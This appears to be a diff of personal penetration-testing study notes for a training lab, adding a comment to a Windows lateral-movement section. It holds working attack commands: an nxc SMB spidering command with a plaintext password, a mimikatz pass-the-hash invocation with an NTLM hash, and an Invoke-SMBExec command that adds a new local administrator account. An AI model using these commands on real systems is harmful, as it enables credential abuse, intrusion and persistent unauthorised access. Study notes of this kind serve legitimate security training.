@@ -237,7 +237,7 @@ Crackmapexec -- nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spid
 ## Windows Lateral Movement Techniques  
 **Pass the Hash(PtH)** :  
 From Windows: using mimikatz, powershell  
-mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit  //starts cmd of target  
 
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1  
 PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark  Password123 /add && net localgroup administrators mark /add" -Verbose  
